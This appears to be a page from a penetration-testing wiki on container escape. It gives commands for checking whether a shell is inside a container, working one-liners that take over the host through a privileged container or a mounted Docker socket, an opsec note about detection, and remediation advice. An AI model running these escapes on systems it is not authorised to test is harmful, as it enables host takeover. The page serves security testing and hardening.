---
tags:
  - Cloud
---

# :material-docker: Container Escape

<span class="pill pill-hard">host takeover</span> <span class="pill pill-info">cloud</span>

Containers share the host kernel. A misconfigured one — privileged, socket-mounted, over-capable — is a doorway to the host and every other container on it.

!!! abstract "TL;DR"
    First check *how* the container is misconfigured (`--privileged`, mounted docker socket, dangerous caps, host namespaces), then pick the matching escape.

## :material-magnify: Am I in a container? How weak is it?

```bash
cat /proc/1/cgroup            # docker/containerd in the path
ls -la /.dockerenv
capsh --print                 # capabilities (SYS_ADMIN, SYS_PTRACE?)
mount | grep docker.sock      # host socket mounted in?
```

## :material-run-fast: Escapes

=== "Privileged container"

    `--privileged` = access host devices. Mount the host disk:
    ```bash
    fdisk -l
    mkdir /mnt/h && mount /dev/sda1 /mnt/h && chroot /mnt/h
    ```

=== "Mounted Docker socket"

    ```bash
    # /var/run/docker.sock inside the container = root on host
    docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host
    ```

=== "CAP_SYS_ADMIN + cgroups"

    Classic `release_agent` escape to run a command as root on the host.

!!! opsec "Escaping is noisy"
    New privileged pods, host mounts, and socket calls are exactly what runtime security (Falco) alerts on.

## :material-shield-check: Remediation

- Never run privileged or mount the docker socket into workloads.
- Drop capabilities, run as non-root, read-only rootfs, seccomp/AppArmor on.

## :material-link-variant: Related

- The next hop after a [Kubernetes](kubernetes.md) pod foothold.
- On the host → [Linux Privesc](../privesc/linux.md).
- Reference: [HackTricks Docker Breakout](https://cloud.hacktricks.wiki/).
